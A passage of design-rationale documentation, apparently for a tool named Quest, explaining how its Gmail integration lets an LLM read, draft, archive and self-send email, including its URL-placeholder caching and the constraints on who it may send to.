Markdown is more readable and easier for LLMs to process than HTML. The `include_html=true` option provides raw HTML when markdown conversion loses important formatting.

**Why draft creation for arbitrary recipients but direct send only to self?**
The `gmail.compose` scope allows sending to anyone, but Quest restricts direct sending to a single `send-self` endpoint where the recipient is always the authenticated user. Emails to other people go through draft creation, letting users review before sending. This prevents accidental or erroneous emails from being sent to third parties by the LLM while still allowing convenient self-delivery of reports, summaries, and other output.

**Why markdown body support for drafts and send-self?**
Both draft creation and send-self support a `body_md` field that accepts markdown, rendered to HTML via `convert_markdown_to_html()` in `api/gmail/helpers.py` (using the `markdown` library with `tables`, `fenced_code`, `nl2br`, and `sane_lists` extensions). The email is sent as `multipart/alternative` with both a plain text part and the rendered HTML. This lets the LLM produce richly formatted emails (headings, lists, tables, code blocks) that display well in email clients. For drafts, the `body` field can optionally provide a custom plain text part; otherwise the raw markdown serves as the plain text fallback.

**Why the `[Quest]` subject prefix?**
The `_QUEST_SUBJECT_PREFIX` constant (`[Quest] `) is automatically prepended to the subject line. This makes it easy for users to identify and filter emails sent by the LLM in their inbox, similar to how Slack messages sent via action requests include a Quest attribution suffix with the sender's name.

**Why expose the `Message-ID` header on its own line?**
The `Message-ID` email header is required for constructing proper email reply threading (via `In-Reply-To` and `References` headers). Emitting it as a labelled line in the rendered markdown avoids a round trip to the Raw API when creating reply drafts.

**Why a `[Quest]/archived` label instead of just removing the INBOX label?**
Simply removing the INBOX label archives the message in Gmail's native sense (moves to All Mail), but it is indistinguishable from a manual archive. Applying a `[Quest]/archived` label creates a visible, filterable group in Gmail's label list so users can easily find and review all messages archived by Quest. The nested label structure (`[Quest]/archived`) groups Quest-related labels under a single parent.

**Why a per-user label ID cache?**
Label IDs are stable once created, but the `labels().list()` API call is required to resolve label names to IDs. Caching the `[Quest]/archived` label ID per user avoids a round trip on every archive operation. The cache is invalidated on stale label errors (label deleted externally) and cleared on server restart.

**Why retry once on stale label ID?**
If the `[Quest]/archived` label is deleted outside of Quest (e.g., manually in Gmail), the cached label ID becomes invalid. Rather than failing permanently, the handler evicts the cache and retries once, which triggers label re-creation. This self-healing behavior avoids requiring user intervention for a recoverable error.

**Why reject native Google Workspace types as attachments?**
Native Google file types (Docs, Sheets, Slides, etc. -- MIME types starting with `application/vnd.google-apps.`) have no downloadable binary content. The Drive API's `alt=media` download does not work for them. Instead, the error message directs the LLM to include a link to the document in the email body.

**Why a `"gmail"` attachment type for forwarding instead of downloading attachments to workspace first?**
Fetching attachments from Gmail and re-attaching them in a single draft creation request avoids intermediate file storage and extra round trips. The `_resolve_gmail_attachment()` helper fetches the binary data directly from the Gmail API at draft creation time, keeping the forward workflow simple and efficient.

**Why strip invisible Unicode characters and collapse newlines?**
Email clients (especially Gmail) inject zero-width and invisible Unicode characters for preview text padding, layout control, and bidirectional hints. These characters survive HTML-to-markdown conversion and consume LLM tokens without contributing any visible content. Similarly, nested `<br>`/`<p>` tags in email HTML produce runs of 3+ blank lines after conversion. Stripping both in `clean_email_markdown()` reduces token waste while preserving all meaningful text and paragraph structure.

**Why replace long URLs with numeric identifiers?**
Email HTML bodies frequently contain long tracking URLs, UTM-tagged links, and redirect chains that can easily exceed 200 characters each. These URLs consume significant token budget when sent to the LLM, but the LLM rarely needs to see the full URL text. Replacing URLs >=50 characters with compact `(#N#)` identifiers drastically reduces token usage while preserving all URL information in a retrievable cache. The rendered markdown surfaces a `Replaced URL count: N` line in the header block whenever substitution happened, signalling that `(#N#)` placeholders are present and that the URL lookup endpoints can resolve them.

**Why a three-pass approach for URL replacement?**
Email newsletters commonly contain linked images -- an `<a>` wrapping an `<img>` -- which the HTML-to-markdown converter (markdownify, MIT; replaced the GPL-3.0 html2text) renders as `[ ![alt](img-url) ](link-url)` or `[![alt](img-url)](link-url)`. A single-pass regex for `[text](url)` would match the inner image link but leave the outer link URL as a bare URL that survives into the final output. By processing linked images first as atomic units, then inline links, then bare URLs, all URL structures are handled correctly without interference between passes.

**Why `sqlitedict` for URL mapping cache?**
URL mappings need to persist across multiple tool calls within a conversation (the LLM may fetch a message, then later look up a URL). `sqlitedict` provides a simple key-value store backed by SQLite, stored per-conversation at `data/chats/{conversation_id}/url_mappings.sqlite`. This avoids in-memory state that would be lost on restart, keeps the cache scoped to the conversation lifecycle, and requires no additional infrastructure.

**Why auto-inject conversation_id instead of having the LLM provide it?**
The LLM does not inherently know its own conversation ID. Rather than exposing this internal identifier in tool declarations and hoping the LLM remembers it, route dispatch injects it automatically into any Pydantic body model or scalar handler parameter that declares the field. This keeps the tool interface clean and prevents errors from incorrect or missing IDs.

## Constraints

- The Gmail Simple tools do **not** support search queries. Search must go through the Gmail Raw API via `authed_get`, then message IDs can be fetched via `get_gmail_messages`
- Batch hard limit: 50 IDs per `get_gmail_messages` call (enforced by the batch endpoint)
- Gmail scopes (`gmail.readonly`, `gmail.compose`, `gmail.modify`) must be granted via the Google Services OAuth flow at `/auth/google-services`. No fallback to `google_oauth` login tokens
- Draft creation and send-self use the Google API Client Library (`googleapiclient`) directly via `get_gmail_service()` in `api/gmail/draft_endpoints.py`, not the async `httpx` (`make_authenticated_request`) path used by the message/batch/label read endpoints
- Direct sending is restricted to the authenticated user only (`send-self`). Emails to other recipients must go through draft creation
- URL replacement threshold and constants are in `api/gmail/constants.py`. Mappings cached per-conversation via `sqlitedict` at `data/chats/{conversation_id}/url_mappings.sqlite`
